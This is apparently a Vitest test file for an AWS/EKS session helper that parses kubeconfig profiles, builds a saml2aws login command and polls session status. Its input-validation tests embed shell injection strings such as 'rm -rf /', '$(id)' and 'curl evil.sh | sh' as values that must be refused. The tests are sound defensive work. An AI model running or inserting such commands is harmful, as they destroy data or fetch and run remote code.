import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import {
  awsLoginCommand,
  createAwsSessionChecker,
  createAwsSessionPoller,
  eksUpdateKubeconfigArgs,
  profileForContext,
} from "./aws-session.js";
import type { AwsSessionChecker } from "./aws-session.js";
import * as spawnModule from "./spawn.js";

const KUBECONFIG = `
apiVersion: v1
contexts:
  - name: arn:aws:eks:eu-west-1:123456789012:cluster/app_dev
    context:
      cluster: arn:aws:eks:eu-west-1:123456789012:cluster/app_dev
      user: arn:aws:eks:eu-west-1:123456789012:cluster/app_dev
  - name: kind-kind
    context:
      cluster: kind-kind
      user: kind-kind
users:
  - name: arn:aws:eks:eu-west-1:123456789012:cluster/app_dev
    user:
      exec:
        command: aws
        args: [eks, get-token, --cluster-name, app_dev]
        env:
          - name: AWS_PROFILE
            value: saml
  - name: kind-kind
    user:
      client-certificate-data: ZmFrZQ==
      client-key-data: ZmFrZQ==
`;

describe("profileForContext", () => {
  it("finds the AWS_PROFILE env entry for a context's exec plugin", () => {
    expect(
      profileForContext(KUBECONFIG, "arn:aws:eks:eu-west-1:123456789012:cluster/app_dev"),
    ).toBe("saml");
  });

  it("returns undefined for a context with no exec plugin", () => {
    expect(profileForContext(KUBECONFIG, "kind-kind")).toBeUndefined();
  });

  it("returns undefined for a context not in the kubeconfig", () => {
    expect(profileForContext(KUBECONFIG, "made-up")).toBeUndefined();
  });

  it("returns undefined for an exec block with no env entries", () => {
    const yaml = `
contexts:
  - name: ctx
    context: { cluster: c, user: u }
users:
  - name: u
    user:
      exec: { command: aws, args: [] }
`;
    expect(profileForContext(yaml, "ctx")).toBeUndefined();
  });

  it("returns undefined for malformed YAML rather than throwing", () => {
    expect(profileForContext("not: [valid", "ctx")).toBeUndefined();
  });

  it("returns undefined for an empty document", () => {
    expect(profileForContext("", "ctx")).toBeUndefined();
  });

  // A kubeconfig is user-owned but routinely pasted in from a wiki, a CI
  // artifact or a teammate, and this profile is written verbatim into a live
  // shell. A value that is not a plain AWS profile name is refused here, which
  // costs that context the auto-login and nothing else.
  it.each([
    ["a semicolon", "saml; rm -rf /"],
    ["a command substitution", "saml$(id)"],
    ["a backtick", "saml`id`"],
    ["a newline", "saml\ncurl evil.sh | sh"],
    ["a leading dash", "-saml"],
    ["a space", "saml prod"],
  ])("returns undefined for an AWS_PROFILE containing %s", (_label, value) => {
    const yaml = `
contexts:
  - name: ctx
    context: { cluster: c, user: u }
users:
  - name: u
    user:
      exec:
        command: aws
        env:
          - name: AWS_PROFILE
            value: ${JSON.stringify(value)}
`;
    expect(profileForContext(yaml, "ctx")).toBeUndefined();
  });

  it("still accepts ordinary profile names", () => {
    for (const value of ["saml", "opf-prod", "dev.2", "acct_1"]) {
      const yaml = `
contexts:
  - name: ctx
    context: { cluster: c, user: u }
users:
  - name: u
    user:
      exec:
        command: aws
        env:
          - name: AWS_PROFILE
            value: ${value}
`;
      expect(profileForContext(yaml, "ctx")).toBe(value);
    }
  });
});

describe("eksUpdateKubeconfigArgs", () => {
  it("reads region and cluster name off an EKS ARN context", () => {
    expect(eksUpdateKubeconfigArgs("arn:aws:eks:eu-west-1:123456789012:cluster/app_dev")).toEqual({
      name: "app_dev",
      region: "eu-west-1",
    });
  });

  it("returns undefined for a non-ARN context", () => {
    expect(eksUpdateKubeconfigArgs("kind-kind")).toBeUndefined();
  });

  it("returns undefined for an ARN missing the cluster/ segment", () => {
    expect(eksUpdateKubeconfigArgs("arn:aws:eks:eu-west-1:123456789012:app_dev")).toBeUndefined();
  });

  // The name and region come out of a file that is often pasted rather than
  // written, and go straight into a shell line. Anything that is not a plain
  // EKS name or region is refused, leaving that context on the pre-auto-login
  // path rather than typing it at a prompt.
  it.each([
    "arn:aws:eks:eu-west-1:123456789012:cluster/app_dev; rm -rf /",
    "arn:aws:eks:eu-west-1:123456789012:cluster/$(curl evil.sh|sh)",
    "arn:aws:eks:eu-west-1:123456789012:cluster/opf`id`",
    "arn:aws:eks:eu-west-1:123456789012:cluster/opf dev",
    "arn:aws:eks:eu-west-1:123456789012:cluster/-opf",
  ])("returns undefined for a cluster name that is not a plain identifier (%s)", (context) => {
    expect(eksUpdateKubeconfigArgs(context)).toBeUndefined();
  });

  it.each([
    "arn:aws:eks:eu-west-1; id:123456789012:cluster/app_dev",
    "arn:aws:eks:EU-WEST-1:123456789012:cluster/app_dev",
    "arn:aws:eks:$(id):123456789012:cluster/app_dev",
  ])("returns undefined for a region that is not a plain region (%s)", (context) => {
    expect(eksUpdateKubeconfigArgs(context)).toBeUndefined();
  });

  it("still reads real-looking ARNs", () => {
    expect(eksUpdateKubeconfigArgs("arn:aws:eks:us-east-2:123456789012:cluster/prod-1.2")).toEqual({
      name: "prod-1.2",
      region: "us-east-2",
    });
  });
});

describe("awsLoginCommand", () => {
  it("chains saml2aws login and aws eks update-kubeconfig with &&", () => {
    expect(awsLoginCommand("app_dev", "eu-west-1", "saml")).toBe(
      "saml2aws login && aws eks update-kubeconfig --name app_dev --region eu-west-1 --profile saml",
    );
  });
});

describe("createAwsSessionChecker", () => {
  it("returns true when aws sts get-caller-identity exits 0", async () => {
    const spy = vi
      .spyOn(spawnModule, "runCommand")
      .mockResolvedValue({ code: 0, stdout: "{}", stderr: "" });
    try {
      const check = createAwsSessionChecker({ PATH: "/usr/bin" });
      expect(await check("saml", "eu-west-1")).toBe(true);
      expect(spy).toHaveBeenCalledWith(
        "aws",
        ["sts", "get-caller-identity", "--profile", "saml", "--region", "eu-west-1"],
        { PATH: "/usr/bin" },
      );
    } finally {
      spy.mockRestore();
    }
  });

  it("returns false when it exits non-zero", async () => {
    const spy = vi
      .spyOn(spawnModule, "runCommand")
      .mockResolvedValue({ code: 1, stdout: "", stderr: "ExpiredToken" });
    try {
      expect(await createAwsSessionChecker({})("saml")).toBe(false);
    } finally {
      spy.mockRestore();
    }
  });

  it("omits --region when none is given", async () => {
    const spy = vi
      .spyOn(spawnModule, "runCommand")
      .mockResolvedValue({ code: 0, stdout: "", stderr: "" });
    try {
      await createAwsSessionChecker({})("saml");
      expect(spy).toHaveBeenCalledWith(
        "aws",
        ["sts", "get-caller-identity", "--profile", "saml"],
        {},
      );
    } finally {
      spy.mockRestore();
    }
  });

  it("returns false rather than throwing when aws is not on PATH", async () => {
    const spy = vi.spyOn(spawnModule, "runCommand").mockRejectedValue(new Error("ENOENT"));
    try {
      expect(await createAwsSessionChecker({})("saml")).toBe(false);
    } finally {
      spy.mockRestore();
    }
  });
});

describe("createAwsSessionPoller", () => {
  beforeEach(() => vi.useFakeTimers());
  afterEach(() => vi.useRealTimers());

  it("resolves true as soon as check succeeds", async () => {
    const results = [false, false, true];
    const check: AwsSessionChecker = async () => results.shift() ?? true;
    const poll = createAwsSessionPoller(check, { intervalMs: 1_000, timeoutMs: 10_000 });

    const done = poll("saml");
    await vi.advanceTimersByTimeAsync(1_000);
    await vi.advanceTimersByTimeAsync(1_000);
    expect(await done).toBe(true);
  });

  it("resolves false once the timeout elapses", async () => {
    const check: AwsSessionChecker = async () => false;
    const poll = createAwsSessionPoller(check, { intervalMs: 1_000, timeoutMs: 3_000 });

    const done = poll("saml");
    await vi.advanceTimersByTimeAsync(3_000);
    expect(await done).toBe(false);
  });
});
